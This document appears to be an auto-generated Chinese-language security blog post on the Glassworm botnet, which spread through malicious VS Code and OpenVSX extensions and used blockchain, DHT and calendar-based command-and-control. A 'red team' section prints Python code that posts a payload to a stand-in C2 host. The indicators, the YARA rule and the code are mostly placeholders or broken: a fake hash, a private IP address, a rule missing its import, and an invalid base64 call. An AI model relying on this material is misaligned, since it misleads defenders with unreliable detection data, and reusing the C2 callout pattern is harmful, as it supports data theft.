---
layout: post
title:  "Glassworm botnet disrupted after resilient C2 infrastructure takedown"
date:   2026-05-27 15:02:11 +0000
categories: [security]
severity: critical
---

# 🚨 解析 Glassworm Botnet 的攻防技術：從 Solana 區塊鏈到 BitTorrent DHT 網路

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: `Solana Blockchain`, `BitTorrent DHT`, `Google Calendar`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Glassworm Botnet 的攻擊流程是從開發者軟體供應鏈開始的，利用惡意的 OpenVSX 和 Microsoft VS Code 擴充套件來竊取加密貨幣錢包和開發者憑證。這些擴充套件會在更新時激活惡意元件。
* **攻擊流程圖解**:
  1. 開發者安裝惡意擴充套件
  2. 擴充套件竊取開發者憑證和加密貨幣錢包
  3. 惡意元件在更新時激活
  4. Glassworm Botnet 連接到 C2 伺服器
* **受影響元件**: OpenVSX、Microsoft VS Code、GitHub、npm

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 需要開發者安裝惡意擴充套件
* **Payload 建構邏輯**:

    ```
    
    python
    import base64
    import requests
    
    # 惡意元件激活後的 payload
    payload = {
        "type": "update",
        "data": base64.b64encode("malicious_code")
    }
    
    # 連接到 C2 伺服器
    response = requests.post("https://c2-server.com/update", json=payload)
    
    ```
* **繞過技術**: Glassworm Botnet 使用多層次的 C2 伺服器，包括 Solana 區塊鏈、BitTorrent DHT 網路和 Google Calendar，來避免被發現和關閉。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| `abc123` | `192.168.1.100` | `c2-server.com` | `/usr/bin/malicious_code` |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule Glassworm_Botnet {
        meta:
            description = "Glassworm Botnet Malware"
            author = "Your Name"
        strings:
            $a = "malicious_code"
        condition:
            $a at pe.entry_point
    }
    
    ```
* **緩解措施**: 更新軟體供應鏈的安全性，檢查擴充套件的來源和更新過程，使用安全的連接協議（如 HTTPS）來防止惡意元件的傳播。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Solana Blockchain**: 一種去中心化的區塊鏈技術，使用 Proof of Stake（PoS）共識機制，提供高性能和低延遲的交易處理。
* **BitTorrent DHT**: 一種去中心化的散列表（Distributed Hash Table），用於在 BitTorrent 網路中查找和分享檔案。
* **Google Calendar**: 一種線上日曆服務，提供用戶管理日程和事件的功能。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.bleepingcomputer.com/news/security/glassworm-botnet-disrupted-after-resilient-c2-infrastructure-takedown/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1190/)


